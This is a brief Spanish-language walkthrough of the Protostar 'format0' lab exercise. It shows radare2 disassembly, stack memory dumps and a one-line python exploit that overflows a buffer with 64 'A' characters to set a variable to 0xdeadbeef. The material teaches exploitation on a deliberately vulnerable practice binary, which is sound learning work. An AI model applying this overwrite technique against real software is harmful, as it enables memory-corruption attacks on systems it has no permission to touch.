
1. Cuando EIP apunta a 0x08048413
;-- eip:
|           0x08048413      8b45f4         mov eax, dword [local_ch]
|           0x08048416      3defbeadde     cmp eax, 0xdeadbeef
|       ,=< 0x0804841b      750c           jne 0x8048429               ;[2]
|       |   0x0804841d      c70424108504.  mov dword [esp], str.you_have_hit_the_target_
|       |   0x08048424      e807ffffff     call sym.imp.puts           ;[3] ; int puts(c
        `-> 0x08048429      c9             leave
\           0x0804842a      c3             ret

2. Vemos nuestro valor de la variable "target" hemos sobreescrito con 0xdeadbeef!!
[0x080483f4]> px@ebp-0xc
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xff9f43ac  efbe adde 0000 0000 dbb0 d1f7 d843 9fff  .............C..

[0x080483f4]> px@esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xff9f4350  6c43 9fff 3864 9fff 40c9 f1f7 c200 0000  lC..8d..@.......
0xff9f4360  0000 0000 0000 c300 0000 0000 4141 4141  ............AAAA
0xff9f4370  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xff9f4380  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xff9f4390  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xff9f43a0  4141 4141 4141 4141 4141 4141 efbe adde  AAAAAAAAAAAA....

EXPLOIT:

user@protostar:/tmp$ ./format0 $(python -c print'"A"*64+ "\xef\xbe\xad\xde"')
you have hit the target correctly :)

